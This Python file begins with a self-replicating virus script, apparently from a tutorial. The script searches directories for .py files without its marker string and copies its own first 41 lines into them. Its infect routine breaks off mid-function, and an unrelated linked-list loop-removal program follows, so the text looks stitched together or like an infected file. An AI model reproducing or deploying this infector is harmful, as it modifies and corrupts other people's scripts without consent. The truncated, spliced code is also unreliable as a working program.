#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to detect and remove loop
  
# Node class
  
  
class Node:
  
    # Constructor to initialize the node object
    def __init__(self, data):
        self.data = data
        self.next = None
  
  
class LinkedList:
  
    # Function to initialize head
    def __init__(self):
        self.head = None
  
    # Function to insert a new node at the beginning
    def push(self, new_data):
        new_node = Node(new_data)
        new_node.next = self.head
        self.head = new_node
  
    def detectAndRemoveLoop(self):  
      if self.head is None:
          return
      if self.head.next is None:
          return
      slow_p = self.head
      fast_p = self.head
           
      while(slow_p and fast_p and fast_p.next):
          slow_p = slow_p.next
          fast_p = fast_p.next.next
  
          # If slow_p and fast_p meet at some point then
          # there is a loop
          if slow_p == fast_p:
            slow_p = self.head
              # Finding the beginning of the loop
            while (slow_p.next != fast_p.next):
              slow_p = slow_p.next
              fast_p = fast_p.next
  
                # Sinc fast.next is the looping point
            fast_p.next = None  # Remove loop
  
    # Utility function to print the LinkedList
  
    def printList(self):
        temp = self.head
        while(temp):
            print(temp.data, end = ' ')
            temp = temp.next
  
  
# Driver program
llist = LinkedList()
llist.head = Node(50)
llist.head.next = Node(20)
llist.head.next.next = Node(15)
llist.head.next.next.next = Node(4)
llist.head.next.next.next.next = Node(10)
  
# Create a loop for testing
llist.head.next.next.next.next.next = llist.head.next.next
  
llist.detectAndRemoveLoop()
  
print("Linked List after removing loop")
llist.printList()
  
# This code is contributed by Nikhil Kumar Singh(nickzuck_007)